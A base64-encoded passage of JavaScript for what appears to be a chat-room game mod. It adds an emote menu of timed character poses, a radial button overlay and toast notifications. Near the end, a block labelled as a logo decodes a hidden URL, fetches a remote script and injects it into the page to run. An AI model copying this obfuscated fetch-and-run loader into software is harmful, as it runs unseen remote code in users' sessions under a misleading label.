QbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCA1MDAwKTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICAgIGRlbGV0ZSBJbnZlbnRvcnlHZXQoUGxheWVyLCAnRW1vdGljb24nKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodDsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCA2MDAwKTsgICAgCn0gfSwKICB7IG5hbWU6ICJDaGVlciIsIGFjdGlvbjogKCkgPT4gewogICAgc2hvd1RvYXN0c2NwZygpOwogICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDIwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAzMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNDAwMCk7ICAgIAogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA1MDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNjAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDcwMDApOyB9IH0sCiAgeyBuYW1lOiAiSnVtcGluZyBKYWNrcyIsIGFjdGlvbjogKCkgPT4gewogICAgc2hvd1RvYXN0c2NwZygpOwogICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgIEhlaWdodDogMTUwCiAgICAgICAgICB9OwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzT3BlbiIpOwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAxMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gdW5kZWZpbmVkOwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzQ2xvc2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDIwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgSW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgICAgICAgICAgSGVpZ2h0OiAxNTAKICAgICAgICAgIH07CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkxlZ3NPcGVuIik7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIikKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMzAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBkZWxldGUgSW52ZW50b3J5R2V0KFBsYXllciwgJ0Vtb3RpY29uJykuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQ7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDQwMDApOyAgICAgfSB9LAogIHsgbmFtZTogIkJ1cnBlZXMiLCBhY3Rpb246ICgpID0+IHsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiSG9ndGllZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAxMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMjAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDMwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA0MDAwKTsgICAgCiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkhvZ3RpZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDYwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA3MDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgODAwMCk7IH0gfSwKICB7IG5hbWU6ICJTbGVlcCIsIGFjdGlvbjogKCkgPT4gewogICAgc2hvd1RvYXN0c2NwZygpOwogICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJIb2d0aWVkIik7CiAgQ2hhcmFjdGVyU2V0RmFjaWFsRXhwcmVzc2lvbihQbGF5ZXIsICJFeWVzIiwgIkNsb3NlZCIpOwogIENoYXJhY3RlclNldEZhY2lhbEV4cHJlc3Npb24oUGxheWVyLCAiRXllczIiLCAiQ2xvc2VkIik7CiAgQ2hhcmFjdGVyU2V0RmFjaWFsRXhwcmVzc2lvbihQbGF5ZXIsICJFbW90aWNvbiIsICJTbGVlcCIpOwogIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcik7ICB9IH0KXTsKCi8vIENyZWF0ZSBidXR0b24gZWxlbWVudHMKY29uc3QgYnV0dG9uQ29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS53aWR0aCA9ICIzMDBweCI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS5oZWlnaHQgPSAiMzAwcHgiOwpidXR0b25Db250YWluZXIuc3R5bGUubGVmdCA9ICI1MCUiOwpidXR0b25Db250YWluZXIuc3R5bGUudG9wID0gIjUwJSI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS50cmFuc2Zvcm0gPSAidHJhbnNsYXRlKC01MCUsIC01MCUpIjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CmNvbnN0IGJ1dHRvbkNpcmNsZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpidXR0b25DaXJjbGUuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwpidXR0b25DaXJjbGUuc3R5bGUud2lkdGggPSAiMjAwcHgiOwpidXR0b25DaXJjbGUuc3R5bGUuaGVpZ2h0ID0gIjIwMHB4IjsKYnV0dG9uQ2lyY2xlLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwpidXR0b25DaXJjbGUuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLm9wYWNpdHkgPSAiMSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5sZWZ0ID0gIjUwJSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS50b3AgPSAiNTAlIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLnRyYW5zZm9ybSA9ICJ0cmFuc2xhdGUoLTUwJSwgLTUwJSkiOwpidXR0b25DaXJjbGUuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b25DaXJjbGUuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCBibGFjayI7CgpidXR0b25Db250YWluZXIuYXBwZW5kQ2hpbGQoYnV0dG9uQ2lyY2xlKTsKY29uc3QgbG9nbyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwpsb2dvLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwpsb2dvLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKbG9nby5zdHlsZS53aWR0aCA9ICI4MHB4IjsKbG9nby5zdHlsZS5oZWlnaHQgPSAiODBweCI7CmxvZ28uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7CmxvZ28uc3R5bGUubGVmdCA9ICI1MCUiOwpsb2dvLnN0eWxlLnRvcCA9ICI1MCUiOwpsb2dvLnN0eWxlLnRyYW5zZm9ybSA9ICJ0cmFuc2xhdGUoLTUwJSwgLTUwJSkiOwpidXR0b25DaXJjbGUuYXBwZW5kQ2hpbGQobG9nbyk7CmNvbnN0IGJ1dHRvbnMgPSBbXTsKZm9yIChsZXQgaSA9IDA7IGkgPCBidXR0b25EYXRhLmxlbmd0aDsgaSsrKSB7CiAgY29uc3QgYnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgYnV0dG9uLmlubmVyVGV4dCA9IGJ1dHRvbkRhdGFbaV0ubmFtZTsKICBidXR0b24uc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwogIGJ1dHRvbi5zdHlsZS53aWR0aCA9ICI4MHB4IjsKICBidXR0b24uc3R5bGUuaGVpZ2h0ID0gIjgwcHgiOwogIGJ1dHRvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKICBidXR0b24uc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKICBidXR0b24uc3R5bGUuY29sb3IgPSAid2hpdGUiOwogIGJ1dHRvbi5zdHlsZS5ib3hTaGFkb3cgPSAiMCAycHggNXB4IHJnYmEoMCwgMCwgMCwgMC4zKSI7CiAgYnV0dG9uLnN0eWxlLmxlZnQgPSAiNTAlIjsKICBidXR0b24uc3R5bGUudG9wID0gIjUwJSI7CiAgYnV0dG9uLnN0eWxlLnRyYW5zZm9ybSA9IGB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgcm90YXRlKCR7aSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSB0cmFuc2xhdGUoMCwgLTEwMHB4KSByb3RhdGUoJHstaSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKWA7CiAgYnV0dG9uLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjJzIGVhc2UtaW4tb3V0LCB0cmFuc2Zvcm0gMC4ycyBlYXNlLWluLW91dCI7CiAgYnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgYnV0dG9uRGF0YVtpXS5hY3Rpb24pOwogIGJ1dHRvbkNvbnRhaW5lci5hcHBlbmRDaGlsZChidXR0b24pOwogIGJ1dHRvbnMucHVzaChidXR0b24pOwoKICBidXR0b24uYWRkRXZlbnRMaXN0ZW5lcigibW91c2VlbnRlciIsICgpID0+IHsKICAgIGJ1dHRvbi5zdHlsZS50cmFuc2Zvcm0gPSBgdHJhbnNsYXRlKC01MCUsIC01MCUpIHJvdGF0ZSgke2kgKiAoMzYwIC8gYnV0dG9uRGF0YS5sZW5ndGgpfWRlZykgdHJhbnNsYXRlKDAsIC05OXB4KSByb3RhdGUoJHstaSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSBzY2FsZSgxLjA1KWA7CiAgfSk7CgogIGJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWxlYXZlIiwgKCkgPT4gewogICAgYnV0dG9uLnN0eWxlLnRyYW5zZm9ybSA9IGB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgcm90YXRlKCR7aSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSB0cmFuc2xhdGUoMCwgLTEwMHB4KSByb3RhdGUoJHstaSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSBzY2FsZSgxKWA7CiAgfSk7Cn0KCgoKbGV0IGlzR3JhdmVLZXlEb3duID0gZmFsc2U7CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLCAoZXZlbnQpID0+IHsKaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgaXNHcmF2ZUtleURvd24gPSB0cnVlOwp9IGVsc2UgaWYgKGlzR3JhdmVLZXlEb3duICYmIGV2ZW50LmtleSA9PT0gImUiKSB7CiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChidXR0b25Db250YWluZXIpOwogIGJ1dHRvbkNvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICBpc0dyYXZlS2V5RG93biA9IGZhbHNlOwp9Cn0pOwpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXl1cCIsIChldmVudCkgPT4gewppZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICBpc0dyYXZlS2V5RG93biA9IGZhbHNlOwp9Cn0pOwoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoZXZlbnQpID0+IHsKICBpZiAoIWJ1dHRvbkNvbnRhaW5lci5jb250YWlucyhldmVudC50YXJnZXQpKSB7CiAgICBpZiAoYnV0dG9uQ29udGFpbmVyLnBhcmVudE5vZGUgPT09IGRvY3VtZW50LmJvZHkpIHsKICAgICAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChidXR0b25Db250YWluZXIpOwogICAgfQogICAgYnV0dG9uQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgfQp9KTsKCi8vRW5kIE9mIEVtb3RlIE1lbnUgX19fX19fX19fX19fX19fX19fCgovL0VORCBPRiBDT05URVhUIE1FTlUgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCi8vQkNNRSBMT0dPIE9uIENoYXJhY3RlcgpmZXRjaChhdG9iKCdhSFIwY0hNNkx5OXlZWGN1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEwwSkRUVk0zTDBKRFRTOXRZV2x1TDBKRFRDNXFjdz09JykpCi50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKLnRoZW4odGV4dCA9PiB7CmNvbnN0IHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwpzY3JpcHQuaW5uZXJIVE1MID0gdGV4dDsKZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpOwp9KQoKCmZ1bmN0aW9uIHNob3dUb2FzdHNjcGcoKSB7CiAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24zIikgIT09IG51bGwpIHsKICAgIGNoZWNrYm94My5jaGVja2VkID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjMiKSA9PT0gInRydWUiOwogICAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICAgIEF1ZGlvUGxheUluc3RhbnRTb3VuZCgiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwOTA1MzA0NzkwODM2MzA2NzIvaDQydndjZC1ub3RpZmljYXRpb24tMV92TXFoVmx0Uy5tcDMiLCAxKTsKICAgIH0KICB9CiAgICB2YXIgdG9hc3RDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvdHRvbSA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUucmlnaHQgPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5jb2xvciA9ICIjMTQxNDE0IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgIzRDQUY1MCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJveFNoYWRvdyA9ICIycHggMnB4IDEwcHggcmdiYSgwLCAwLCAwLCAwLjUpIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAiOTk5IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjVzIGVhc2UtaW4tb3V0IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwogICAgdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CnN0YXR1c0Jhci5zdHlsZS5oZWlnaHQgPSAiM3B4IjsKc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CnN0YXR1c0Jhci5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CnN0YXR1c0Jhci5zdHlsZS5ib3R0b20gPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICJ3aWR0aCA1cyBlYXNlLWluLW91dCI7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIwJSI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CgoKLy8gVXBkYXRlIHRoZSB3aWR0aCBvZiB0aGUgc3RhdHVzIGJhcgpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKfSwgMCk7CiAgICAKLy8gY3VzdG9tIEJDTSBpY29uCnZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7Cmljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7Cmljb24uc3R5bGUud2lkdGggPSAiMjNweCI7Cmljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwppY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwppY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwoKdmFyIHRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7CnRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwp0ZXh0LmlubmVySFRNTCA9ICJBY3Rpb24gU3VjY2Vzc2Z1bGx5IEV4ZWN1dGVkIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CgogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwogIAogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMSI7CiAgICB9LCAwKTsKICAKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICB9LCA1MDAwKTsKICAKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7